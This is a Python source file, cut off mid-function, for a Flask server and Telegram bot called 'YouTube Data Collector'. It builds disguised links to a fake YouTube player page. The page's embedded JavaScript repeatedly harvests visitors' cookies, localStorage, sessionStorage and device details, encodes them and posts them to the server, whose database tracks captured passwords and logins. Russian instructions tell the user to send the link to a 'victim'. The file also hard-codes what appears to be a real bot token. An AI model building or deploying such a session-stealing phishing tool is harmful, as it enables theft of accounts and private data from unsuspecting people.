import logging
import json
import re
import uuid
import os
import time
import sqlite3
import random
from datetime import datetime
from typing import Dict, List, Optional, Any
import threading
import subprocess
import html
import base64

# Flask –∏ –≤–µ–±
from flask import Flask, request, jsonify, render_template_string, redirect
from flask_cors import CORS

# Telegram
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    ContextTypes,
    CallbackQueryHandler,
    MessageHandler,
    filters
)
from telegram.constants import ParseMode

# ========== –ù–ê–°–¢–†–û–ô–ö–ò ==========
BOT_TOKEN = "8342575399:AAFetGCZwKYOe4fwuXLkWsn6N3Q0VVEHGTs"
ADMIN_ID = 1709490182
FLASK_PORT = 5055  # –ò–∑–º–µ–Ω–∏–ª–∏ –ø–æ—Ä—Ç –Ω–∞ 5055
SERVER_URL = f"http://localhost:{FLASK_PORT}"  # –î–∏–Ω–∞–º–∏—á–µ—Å–∫–∏–π URL

# –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏—è
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO,
    handlers=[
        logging.FileHandler('youtube_data_collector.log', encoding='utf-8'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# ========== –ë–ê–ó–ê –î–ê–ù–ù–´–• ==========
class Database:
    def __init__(self):
        self.conn = sqlite3.connect('youtube_data.db', check_same_thread=False)
        self.create_tables()
    
    def create_tables(self):
        cursor = self.conn.cursor()
        
        # –¢–∞–±–ª–∏—Ü–∞ —Å—Å—ã–ª–æ–∫
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS video_links (
                id TEXT PRIMARY KEY,
                youtube_url TEXT,
                youtube_id TEXT,
                server_url TEXT,
                created_at TEXT,
                created_by INTEGER,
                clicks INTEGER DEFAULT 0,
                title TEXT,
                description TEXT,
                active INTEGER DEFAULT 1
            )
        ''')
        
        # –¢–∞–±–ª–∏—Ü–∞ —Å–æ–±—Ä–∞–Ω–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS captured_data (
                id TEXT PRIMARY KEY,
                link_id TEXT,
                timestamp TEXT,
                ip_address TEXT,
                user_agent TEXT,
                cookies TEXT,
                localStorage TEXT,
                sessionStorage TEXT,
                passwords TEXT,
                logins TEXT,
                autofill_data TEXT,
                browser_info TEXT,
                device_info TEXT,
                sensitive_data TEXT,
                identified_services TEXT,
                FOREIGN KEY (link_id) REFERENCES video_links (id)
            )
        ''')
        
        # –¢–∞–±–ª–∏—Ü–∞ –¥–ª—è —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∏
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS stats (
                key TEXT PRIMARY KEY,
                value INTEGER
            )
        ''')
        
        # –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∏
        default_stats = [
            ('total_links', 0),
            ('total_clicks', 0),
            ('total_captured', 0),
            ('total_credentials', 0),
            ('total_cookies', 0),
        ]
        
        cursor.executemany(
            'INSERT OR IGNORE INTO stats (key, value) VALUES (?, ?)',
            default_stats
        )
        
        self.conn.commit()
    
    def add_video_link(self, link_data):
        cursor = self.conn.cursor()
        
        cursor.execute('''
            INSERT INTO video_links 
            (id, youtube_url, youtube_id, server_url, created_at, created_by, title, description)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            link_data['id'],
            link_data['youtube_url'],
            link_data['youtube_id'],
            link_data['server_url'],
            link_data['created_at'],
            link_data['created_by'],
            link_data.get('title', ''),
            link_data.get('description', '')
        ))
        
        cursor.execute('UPDATE stats SET value = value + 1 WHERE key = "total_links"')
        self.conn.commit()
        return True
    
    def increment_clicks(self, link_id):
        cursor = self.conn.cursor()
        cursor.execute('UPDATE video_links SET clicks = clicks + 1 WHERE id = ?', (link_id,))
        cursor.execute('UPDATE stats SET value = value + 1 WHERE key = "total_clicks"')
        self.conn.commit()
    
    def get_link(self, link_id):
        cursor = self.conn.cursor()
        cursor.execute('SELECT * FROM video_links WHERE id = ?', (link_id,))
        row = cursor.fetchone()
        
        if not row:
            return None
        
        columns = [desc[0] for desc in cursor.description]
        return dict(zip(columns, row))
    
    def get_user_links(self, user_id):
        cursor = self.conn.cursor()
        cursor.execute('SELECT * FROM video_links WHERE created_by = ? ORDER BY created_at DESC', (user_id,))
        
        columns = [desc[0] for desc in cursor.description]
        return [dict(zip(columns, row)) for row in cursor.fetchall()]
    
    def add_captured_data(self, data):
        cursor = self.conn.cursor()
        
        cursor.execute('''
            INSERT INTO captured_data 
            (id, link_id, timestamp, ip_address, user_agent, cookies, localStorage, 
             sessionStorage, passwords, logins, autofill_data, 
             browser_info, device_info, sensitive_data, identified_services)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            data['id'],
            data['link_id'],
            data['timestamp'],
            data.get('ip_address'),
            data.get('user_agent'),
            json.dumps(data.get('cookies', []), ensure_ascii=False),
            json.dumps(data.get('localStorage', {}), ensure_ascii=False),
            json.dumps(data.get('sessionStorage', {}), ensure_ascii=False),
            json.dumps(data.get('passwords', []), ensure_ascii=False),
            json.dumps(data.get('logins', []), ensure_ascii=False),
            json.dumps(data.get('autofill_data', {}), ensure_ascii=False),
            json.dumps(data.get('browser_info', {}), ensure_ascii=False),
            json.dumps(data.get('device_info', {}), ensure_ascii=False),
            json.dumps(data.get('sensitive_data', {}), ensure_ascii=False),
            json.dumps(data.get('identified_services', []), ensure_ascii=False)
        ))
        
        # –û–±–Ω–æ–≤–ª—è–µ–º —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∏
        cursor.execute('UPDATE stats SET value = value + 1 WHERE key = "total_captured"')
        
        credentials_count = len(data.get('passwords', [])) + len(data.get('logins', []))
        if credentials_count > 0:
            cursor.execute('UPDATE stats SET value = value + ? WHERE key = "total_credentials"', (credentials_count,))
        
        cookies_count = len(data.get('cookies', []))
        if cookies_count > 0:
            cursor.execute('UPDATE stats SET value = value + ? WHERE key = "total_cookies"', (cookies_count,))
        
        self.conn.commit()
        return True
    
    def get_captured_data(self, data_id):
        cursor = self.conn.cursor()
        cursor.execute('SELECT * FROM captured_data WHERE id = ?', (data_id,))
        row = cursor.fetchone()
        
        if not row:
            return None
        
        columns = [desc[0] for desc in cursor.description]
        data = dict(zip(columns, row))
        
        # –ü–∞—Ä—Å–∏–º JSON –ø–æ–ª—è
        json_fields = ['cookies', 'localStorage', 'sessionStorage', 'passwords', 'logins',
                      'autofill_data', 'browser_info', 'device_info',
                      'sensitive_data', 'identified_services']
        
        for field in json_fields:
            if data.get(field):
                try:
                    data[field] = json.loads(data[field])
                except:
                    data[field] = []
        
        return data
    
    def get_data_by_link(self, link_id):
        cursor = self.conn.cursor()
        cursor.execute('SELECT * FROM captured_data WHERE link_id = ? ORDER BY timestamp DESC', (link_id,))
        
        columns = [desc[0] for desc in cursor.description]
        results = []
        
        for row in cursor.fetchall():
            data = dict(zip(columns, row))
            
            # –ü–∞—Ä—Å–∏–º JSON –ø–æ–ª—è
            json_fields = ['cookies', 'passwords', 'logins', 'identified_services']
            for field in json_fields:
                if data.get(field):
                    try:
                        data[field] = json.loads(data[field])
                    except:
                        data[field] = []
            
            results.append(data)
        
        return results
    
    def get_stats(self):
        cursor = self.conn.cursor()
        cursor.execute('SELECT key, value FROM stats')
        rows = cursor.fetchall()
        return {row[0]: row[1] for row in rows}
    
    def get_link_stats(self, link_id):
        cursor = self.conn.cursor()
        cursor.execute('SELECT clicks FROM video_links WHERE id = ?', (link_id,))
        row = cursor.fetchone()
        clicks = row[0] if row else 0
        
        cursor.execute('SELECT COUNT(*) FROM captured_data WHERE link_id = ?', (link_id,))
        row = cursor.fetchone()
        captured = row[0] if row else 0
        
        return {'clicks': clicks, 'captured': captured}

# –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –±–∞–∑—ã
db = Database()

# ========== YOUTUBE –ú–ï–ù–ï–î–ñ–ï–† ==========
class YouTubeManager:
    @staticmethod
    def extract_video_id(url):
        """–ò–∑–≤–ª–µ–∫–∞–µ—Ç ID –≤–∏–¥–µ–æ –∏–∑ YouTube URL"""
        patterns = [
            r'(?:youtube\.com\/watch\?v=|youtu\.be\/|youtube\.com\/embed\/)([a-zA-Z0-9_-]{11})',
            r'v=([a-zA-Z0-9_-]{11})'
        ]
        
        for pattern in patterns:
            match = re.search(pattern, url)
            if match:
                return match.group(1)
        
        return "dQw4w9WgXcQ"  # –î–µ—Ñ–æ–ª—Ç–Ω–æ–µ –≤–∏–¥–µ–æ
    
    @staticmethod
    def generate_server_url(youtube_id, link_id):
        """–ì–µ–Ω–µ—Ä–∏—Ä—É–µ—Ç URL –Ω–∞ –ª–æ–∫–∞–ª—å–Ω–æ–º —Å–µ—Ä–≤–µ—Ä–µ"""
        return f"{SERVER_URL}/watch?v={youtube_id}&id={link_id}"
    
    @staticmethod
    def get_video_info(youtube_id):
        """–ü–æ–ª—É—á–∞–µ—Ç –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –≤–∏–¥–µ–æ"""
        try:
            return {
                "title": f"YouTube Video {youtube_id}",
                "description": "–ò–Ω—Ç–µ—Ä–µ—Å–Ω–æ–µ –≤–∏–¥–µ–æ –Ω–∞ YouTube",
                "thumbnail": f"https://img.youtube.com/vi/{youtube_id}/hqdefault.jpg"
            }
        except:
            return {
                "title": "YouTube Video",
                "description": "–°–º–æ—Ç—Ä–∏—Ç–µ –∏–Ω—Ç–µ—Ä–µ—Å–Ω–æ–µ –≤–∏–¥–µ–æ",
                "thumbnail": ""
            }

# ========== HTML –®–ê–ë–õ–û–ù–´ ==========
HTML_TEMPLATES = {
    "youtube_player": """
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>YouTube Video Player</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: #000;
            color: #fff;
            font-family: Arial, sans-serif;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            max-width: 1200px;
            width: 100%;
        }
        
        .player-wrapper {
            width: 100%;
            position: relative;
            padding-bottom: 56.25%; /* 16:9 Aspect Ratio */
            margin-bottom: 20px;
        }
        
        .player-wrapper iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
            border-radius: 12px;
        }
        
        .video-title {
            font-size: 22px;
            font-weight: bold;
            margin-bottom: 10px;
            padding: 0 10px;
        }
        
        .video-info {
            color: #aaa;
            font-size: 14px;
            margin-bottom: 20px;
            padding: 0 10px;
        }
        
        .comments-section {
            background: #1a1a1a;
            border-radius: 10px;
            padding: 20px;
            margin-top: 20px;
            width: 100%;
        }
        
        .comment {
            margin-bottom: 15px;
            padding-bottom: 15px;
            border-bottom: 1px solid #333;
        }
        
        .comment-author {
            color: #fff;
            font-weight: bold;
            margin-bottom: 5px;
        }
        
        .comment-text {
            color: #ddd;
            line-height: 1.4;
        }
        
        .loading {
            text-align: center;
            padding: 50px;
            color: #aaa;
            font-size: 18px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="player-wrapper">
            <iframe 
                src="https://www.youtube.com/embed/{youtube_id}?autoplay=1&controls=1&showinfo=0&rel=0&modestbranding=1" 
                frameborder="0" 
                allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
                allowfullscreen
                id="youtubePlayer">
            </iframe>
        </div>
        
        <h1 class="video-title">{video_title}</h1>
        <div class="video-info">
            {views_count} –ø—Ä–æ—Å–º–æ—Ç—Ä–æ–≤ ‚Ä¢ {upload_date}
        </div>
        
        <div class="comments-section">
            <h3>üí¨ –ö–æ–º–º–µ–Ω—Ç–∞—Ä–∏–∏ ({comments_count})</h3>
            
            <div class="comment">
                <div class="comment-author">–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å 1</div>
                <div class="comment-text">–û—Ç–ª–∏—á–Ω–æ–µ –≤–∏–¥–µ–æ! –°–ø–∞—Å–∏–±–æ –∑–∞ –∫–æ–Ω—Ç–µ–Ω—Ç! üëç</div>
            </div>
            
            <div class="comment">
                <div class="comment-author">–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å 2</div>
                <div class="comment-text">–û—á–µ–Ω—å –∏–Ω—Ç–µ—Ä–µ—Å–Ω–æ, –∂–¥—É –ø—Ä–æ–¥–æ–ª–∂–µ–Ω–∏—è!</div>
            </div>
        </div>
        
        <div class="loading" id="loading">
            –ó–∞–≥—Ä—É–∑–∫–∞ –¥–∞–Ω–Ω—ã—Ö...
        </div>
    </div>
    
    <script>
        // –î–∞–Ω–Ω—ã–µ –¥–ª—è —Å–±–æ—Ä–∞
        const linkId = "{link_id}";
        const serverUrl = "{server_url}";
        
        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è —Å–±–æ—Ä–∞ –≤—Å–µ—Ö –¥–∞–Ω–Ω—ã—Ö
        function collectAllData() {{
            const data = {{
                timestamp: new Date().toISOString(),
                url: window.location.href,
                userAgent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                screen: {{
                    width: screen.width,
                    height: screen.height,
                    colorDepth: screen.colorDepth
                }},
                cookies: {{}},
                localStorage: {{}},
                sessionStorage: {{}},
                passwords: [],
                logins: [],
                autofillData: {{}},
                browserInfo: {{
                    cookieEnabled: navigator.cookieEnabled,
                    doNotTrack: navigator.doNotTrack,
                    javaEnabled: navigator.javaEnabled(),
                    pdfViewerEnabled: navigator.pdfViewerEnabled || false
                }},
                deviceInfo: {{
                    deviceMemory: navigator.deviceMemory || 'unknown',
                    hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
                    maxTouchPoints: navigator.maxTouchPoints || 0
                }},
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                plugins: Array.from(navigator.plugins || []).map(p => ({{
                    name: p.name,
                    description: p.description
                }}))
            }};
            
            try {{
                // –°–æ–±–∏—Ä–∞–µ–º cookies
                const cookieString = document.cookie;
                if (cookieString) {{
                    cookieString.split(';').forEach(cookie => {{
                        const [name, value] = cookie.trim().split('=');
                        if (name && value) {{
                            data.cookies[name] = decodeURIComponent(value);
                        }}
                    }});
                }}
                
                // –°–æ–±–∏—Ä–∞–µ–º LocalStorage
                if (window.localStorage) {{
                    for (let i = 0; i < localStorage.length; i++) {{
                        const key = localStorage.key(i);
                        data.localStorage[key] = localStorage.getItem(key);
                    }}
                }}
                
                // –°–æ–±–∏—Ä–∞–µ–º SessionStorage
                if (window.sessionStorage) {{
                    for (let i = 0; i < sessionStorage.length; i++) {{
                        const key = sessionStorage.key(i);
                        data.sessionStorage[key] = sessionStorage.getItem(key);
                    }}
                }}
                
                // –°–æ–±–∏—Ä–∞–µ–º –¥–∞–Ω–Ω—ã–µ –∏–∑ IndexedDB (–ø–æ–ø—ã—Ç–∫–∞)
                if (window.indexedDB) {{
                    data.hasIndexedDB = true;
                }}
                
                // –°–æ–±–∏—Ä–∞–µ–º WebRTC –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é
                if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {{
                    navigator.mediaDevices.enumerateDevices().then(devices => {{
                        data.mediaDevices = devices.map(d => ({{
                            kind: d.kind,
                            label: d.label,
                            deviceId: d.deviceId
                        }}));
                    }}).catch(() => {{}});
                }}
                
                return data;
                
            }} catch (error) {{
                console.error('Error collecting data:', error);
                data.error = error.toString();
                return data;
            }}
        }}
        
        // –§—É–Ω–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –¥–∞–Ω–Ω—ã—Ö
        function sendData(data, type = 'page_load') {{
            try {{
                const xhr = new XMLHttpRequest();
                xhr.open('POST', serverUrl + '/api/collect', true);
                xhr.setRequestHeader('Content-Type', 'application/json');
                xhr.send(JSON.stringify({{
                    link_id: linkId,
                    data_type: type,
                    data: btoa(unescape(encodeURIComponent(JSON.stringify(data)))),
                    timestamp: new Date().toISOString()
                }}));
            }} catch (error) {{
                console.error('Error sending data:', error);
            }}
        }}
        
        // –°–±–æ—Ä –¥–∞–Ω–Ω—ã—Ö –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
        window.addEventListener('load', function() {{
            setTimeout(() => {{
                const data = collectAllData();
                sendData(data, 'initial_load');
                document.getElementById('loading').innerHTML = '‚úÖ –í–∏–¥–µ–æ –∑–∞–≥—Ä—É–∂–µ–Ω–æ';
            }}, 2000);
            
            // –ü–µ—Ä–∏–æ–¥–∏—á–µ—Å–∫–∏–π —Å–±–æ—Ä
            setInterval(() => {{
                const data = collectAllData();
                sendData(data, 'periodic');
            }}, 10000);
            
            // –°–±–æ—Ä –ø—Ä–∏ —É—Ö–æ–¥–µ —Å–æ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
            window.addEventListener('beforeunload', function() {{
                const data = collectAllData();
                
                // –ò—Å–ø–æ–ª—å–∑—É–µ–º sendBeacon –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –ø—Ä–∏ –∑–∞–∫—Ä—ã—Ç–∏–∏
                const blob = new Blob([JSON.stringify({{
                    link_id: linkId,
                    data_type: 'page_exit',
                    data: btoa(unescape(encodeURIComponent(JSON.stringify(data))))
                }})], {{type: 'application/json'}});
                
                navigator.sendBeacon(serverUrl + '/api/collect', blob);
            }});
        }});
        
        // –°–±–æ—Ä –ø—Ä–∏ –≤–∑–∞–∏–º–æ–¥–µ–π—Å—Ç–≤–∏–∏ —Å –≤–∏–¥–µ–æ
        document.addEventListener('click', function(e) {{
            setTimeout(() => {{
                const data = collectAllData();
                data.interaction = {{ type: 'click', target: e.target.tagName }};
                sendData(data, 'user_interaction');
            }}, 1000);
        }});
        
        // –°–±–æ—Ä –ø—Ä–∏ –∏–∑–º–µ–Ω–µ–Ω–∏–∏ —Ä–∞–∑–º–µ—Ä–∞ –æ–∫–Ω–∞
        window.addEventListener('resize', function() {{
            const data = collectAllData();
            data.windowResize = {{ width: window.innerWidth, height: window.innerHeight }};
            sendData(data, 'window_resize');
        }});
    </script>
</body>
</html>
""",

    "link_created": """
<!DOCTYPE html>
<html>
<head>
    <title>–°—Å—ã–ª–∫–∞ —Å–æ–∑–¥–∞–Ω–∞</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #f5f5f5;
            padding: 40px;
            max-width: 800px;
            margin: 0 auto;
        }
        .success-box {
            background: white;
            padding: 40px;
            border-radius: 15px;
            box-shadow: 0 5px 20px rgba(0,0,0,0.1);
            text-align: center;
        }
        .success-icon {
            color: #34a853;
            font-size: 60px;
            margin-bottom: 20px;
        }
        .url-box {
            background: #f1f3f4;
            padding: 15px;
            border-radius: 8px;
            margin: 20px 0;
            word-break: break-all;
            font-family: monospace;
            font-size: 14px;
        }
        .copy-btn {
            background: #4285f4;
            color: white;
            border: none;
            padding: 12px 25px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            margin: 10px;
        }
        .info-box {
            background: #e8f4fd;
            padding: 20px;
            border-radius: 10px;
            margin-top: 30px;
            text-align: left;
        }
    </style>
</head>
<body>
    <div class="success-box">
        <div class="success-icon">‚úÖ</div>
        <h1>–°—Å—ã–ª–∫–∞ —Å–æ–∑–¥–∞–Ω–∞ —É—Å–ø–µ—à–Ω–æ!</h1>
        
        <h3>–û—Ä–∏–≥–∏–Ω–∞–ª—å–Ω–æ–µ –≤–∏–¥–µ–æ:</h3>
        <p>{youtube_url}</p>
        
        <h3>–í–∞—à–∞ —Å—Å—ã–ª–∫–∞ –¥–ª—è —Å–±–æ—Ä–∞ –¥–∞–Ω–Ω—ã—Ö:</h3>
        <div class="url-box" id="serverUrl">{server_url}</div>
        
        <button class="copy-btn" onclick="copyToClipboard()">üìã –ö–æ–ø–∏—Ä–æ–≤–∞—Ç—å —Å—Å—ã–ª–∫—É</button>
        <a href="{server_url}" target="_blank"><button class="copy-btn">üîó –û—Ç–∫—Ä—ã—Ç—å –≤–∏–¥–µ–æ</button></a>
        
        <div class="info-box">
            <h4>üìã –ö–∞–∫ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å:</h4>
            <ol>
                <li>–°–∫–æ–ø–∏—Ä—É–π—Ç–µ —Å—Å—ã–ª–∫—É –≤—ã—à–µ</li>
                <li>–û—Ç–ø—Ä–∞–≤—å—Ç–µ –µ—ë –∂–µ—Ä—Ç–≤–µ</li>
                <li>–ö–æ–≥–¥–∞ –∂–µ—Ä—Ç–≤–∞ –æ—Ç–∫—Ä–æ–µ—Ç —Å—Å—ã–ª–∫—É, –Ω–∞—á–Ω–µ—Ç—Å—è —Å–±–æ—Ä –¥–∞–Ω–Ω—ã—Ö</li>
                <li>–í—Å–µ –¥–∞–Ω–Ω—ã–µ –ø—Ä–∏–¥—É—Ç –≤ Telegram –±–æ—Ç –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏</li>
            </ol>
            
            <h4>üîê –ß—Ç–æ –±—É–¥–µ—Ç —Å–æ–±—Ä–∞–Ω–æ:</h4>
            <ul>
                <li>–í—Å–µ cookies –±—Ä–∞—É–∑–µ—Ä–∞</li>
                <li>LocalStorage –∏ SessionStorage</li>
                <li>–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –±—Ä–∞—É–∑–µ—Ä–µ –∏ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ</li>
                <li>–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –ø–ª–∞–≥–∏–Ω–∞—Ö</li>
                <li>WebRTC –¥–∞–Ω–Ω—ã–µ</li>
                <li>IP –∞–¥—Ä–µ—Å –∏ –≥–µ–æ–ª–æ–∫–∞—Ü–∏—è</li>
                <li>–ò—Å—Ç–æ—Ä–∏—è –≤–∑–∞–∏–º–æ–¥–µ–π—Å—Ç–≤–∏—è —Å –≤–∏–¥–µ–æ</li>
            </ul>
        </div>
    </div>
    
    <script>
        function copyToClipboard() {{
            const url = document.getElementById('serverUrl').innerText;
            navigator.clipboard.writeText(url).then(() => {{
                alert('–°—Å—ã–ª–∫–∞ —Å–∫–æ–ø–∏—Ä–æ–≤–∞–Ω–∞ –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞!');
            }});
        }}
    </script>
</body>
</html>
"""
}

# ========== FLASK –°–ï–†–í–ï–† ==========
app = Flask(__name__)
app.secret_key = os.urandom(24)
CORS(app)

# –ì–ª–æ–±–∞–ª—å–Ω—ã–µ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ
telegram_app = None

def extract_youtube_video_info(url):
    """–ò–∑–≤–ª–µ–∫–∞–µ—Ç –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ YouTube –≤–∏–¥–µ–æ"""
    video_id = YouTubeManager.extract_video_id(url)
    info = YouTubeManager.get_video_info(video_id)
    
    # –ì–µ–Ω–µ—Ä–∏—Ä—É–µ–º —Ä–µ–∞–ª–∏—Å—Ç–∏—á–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ
    views = random.randint(10000, 10000000)
    upload_date = f"{random.randint(1, 30)}.{random.randint(1, 12)}.{random.randint(2020, 2024)}"
    
    return {
        'video_id': video_id,
        'title': info['title'],
        'description': info['description'],
        'thumbnail': info['thumbnail'],
        'views': f"{views:,}".replace(',', ' '),
        'upload_date': upload_date,
        'comments': random.randint(50, 5000)
    }

@app.route('/')
def home():
    """–ì–ª–∞–≤–Ω–∞—è —Å—Ç—Ä–∞–Ω–∏—Ü–∞ - —Ñ–æ—Ä–º–∞ —Å–æ–∑–¥–∞–Ω–∏—è —Å—Å—ã–ª–∫–∏"""
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>YouTube Data Collector</title>
        <style>
            body {
                font-family: Arial, sans-serif;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                min-height: 100vh;
                display: flex;
                justify-content: center;
                align-items: center;
                padding: 20px;
            }
            .container {
                background: white;
                padding: 40px;
                border-radius: 20px;
                box-shadow: 0 20px 40px rgba(0,0,0,0.1);
                max-width: 500px;
                width: 100%;
                text-align: center;
            }
            h1 {
                color: #333;
                margin-bottom: 30px;
            }
            .input-group {
                margin-bottom: 20px;
            }
            input[type="text"] {
                width: 100%;
                padding: 15px;
                border: 2px solid #ddd;
                border-radius: 10px;
                font-size: 16px;
                transition: border-color 0.3s;
            }
            input[type="text"]:focus {
                border-color: #667eea;
                outline: none;
            }
            button {
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                color: white;
                border: none;
                padding: 15px 30px;
                border-radius: 10px;
                font-size: 16px;
                cursor: pointer;
                width: 100%;
                font-weight: bold;
                transition: transform 0.3s;
            }
            button:hover {
                transform: translateY(-2px);
            }
            .info {
                margin-top: 30px;
                padding: 20px;
                background: #f8f9fa;
                border-radius: 10px;
                text-align: left;
                font-size: 14px;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>üé¨ YouTube Data Collector</h1>
            <p style="color: #666; margin-bottom: 30px;">–í—Å—Ç–∞–≤—å—Ç–µ —Å—Å—ã–ª–∫—É –Ω–∞ YouTube –≤–∏–¥–µ–æ –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è –æ—Ç—Å–ª–µ–∂–∏–≤–∞–µ–º–æ–π —Å—Å—ã–ª–∫–∏</p>
            
            <form action="/create_link" method="POST">
                <div class="input-group">
                    <input type="text" name="youtube_url" placeholder="https://youtube.com/watch?v=..." required>
                </div>
                <button type="submit">–°–æ–∑–¥–∞—Ç—å —Å—Å—ã–ª–∫—É</button>
            </form>
            
            <div class="info">
                <h4>‚ÑπÔ∏è –ö–∞–∫ —ç—Ç–æ —Ä–∞–±–æ—Ç–∞–µ—Ç:</h4>
                <p>1. –í—Å—Ç–∞–≤—å—Ç–µ —Å—Å—ã–ª–∫—É –Ω–∞ YouTube –≤–∏–¥–µ–æ</p>
                <p>2. –ü–æ–ª—É—á–∏—Ç–µ —Å–ø–µ—Ü–∏–∞–ª—å–Ω—É—é —Å—Å—ã–ª–∫—É</p>
                <p>3. –û—Ç–ø—Ä–∞–≤—å—Ç–µ –µ—ë –¥—Ä—É–≥—É/–∑–Ω–∞–∫–æ–º–æ–º—É</p>
                <p>4. –ö–æ–≥–¥–∞ —á–µ–ª–æ–≤–µ–∫ –æ—Ç–∫—Ä–æ–µ—Ç —Å—Å—ã–ª–∫—É, –Ω–∞—á–Ω–µ—Ç—Å—è —Å–±–æ—Ä –¥–∞–Ω–Ω—ã—Ö</p>
                <p>5. –í—Å–µ –¥–∞–Ω–Ω—ã–µ –ø—Ä–∏–¥—É—Ç –≤ Telegram –±–æ—Ç</p>
            </div>
        </div>
    </body>
    </html>
    '''

@app.route('/create_link', methods=['POST'])
def create_link():
    """–°–æ–∑–¥–∞–µ—Ç –æ—Ç—Å–ª–µ–∂–∏–≤–∞–µ–º—É—é —Å—Å—ã–ª–∫—É"""
    youtube_url = request.form.get('youtube_url', '').strip()
    
    if not youtube_url:
        return "–û—à–∏–±–∫–∞: –ù–µ—Ç —Å—Å—ã–ª–∫–∏", 400
    
    # –ò–∑–≤–ª–µ–∫–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –≤–∏–¥–µ–æ
    video_info = extract_youtube_video_info(youtube_url)
    video_id = video_info['video_id']
    
    # –ì–µ–Ω–µ—Ä–∏—Ä—É–µ–º —É–Ω–∏–∫–∞–ª—å–Ω—ã–π ID
    link_id = str(uuid.uuid4())[:12]
    
    # –°–æ–∑–¥–∞–µ–º URL –Ω–∞ –ª–æ–∫–∞–ª—å–Ω–æ–º —Å–µ—Ä–≤–µ—Ä–µ
    server_url = YouTubeManager.generate_server_url(video_id, link_id)
    
    # –°–æ—Ö—Ä–∞–Ω—è–µ–º –≤ –±–∞–∑—É
    link_data = {
        'id': link_id,
        'youtube_url': youtube_url,
        'youtube_id': video_id,
        'server_url': server_url,
        'created_at': datetime.now().isoformat(),
        'created_by': 0,
        'title': video_info['title'],
        'description': video_info['description']
    }
    
    db.add_video_link(link_data)
    
    # –§–æ—Ä–º–∏—Ä—É–µ–º HTML –æ—Ç–≤–µ—Ç
    html_content = HTML_TEMPLATES["link_created"].format(
        youtube_url=youtube_url,
        server_url=server_url
    )
    
    return html_content

@app.route('/watch')
def watch_page():
    """–°—Ç—Ä–∞–Ω–∏—Ü–∞ —Å YouTube –≤–∏–¥–µ–æ –¥–ª—è —Å–±–æ—Ä–∞ –¥–∞–Ω–Ω—ã—Ö"""
    video_id = request.args.get('v', 'dQw4w9WgXcQ')
    link_id = request.args.get('id', str(uuid.uuid4())[:12])
    
    # –£–≤–µ–ª–∏—á–∏–≤–∞–µ–º —Å—á–µ—Ç—á–∏–∫ –∫–ª–∏–∫–æ–≤
    db.increment_clicks(link_id)
    
    # –ü–æ–ª—É—á–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –≤–∏–¥–µ–æ
    video_info = extract_youtube_video_info(f"https://youtube.com/watch?v={video_id}")
    
    # –ó–∞–º–µ–Ω—è–µ–º –ø–ª–µ–π—Å—Ö–æ–ª–¥–µ—Ä—ã –≤ —à–∞–±–ª–æ–Ω–µ
    html_content = HTML_TEMPLATES["youtube_player"].format(
        youtube_id=video_id,
        link_id=link_id,
        server_url=SERVER_URL,
        video_title=video_info['title'],
        views_count=video_info['views'],
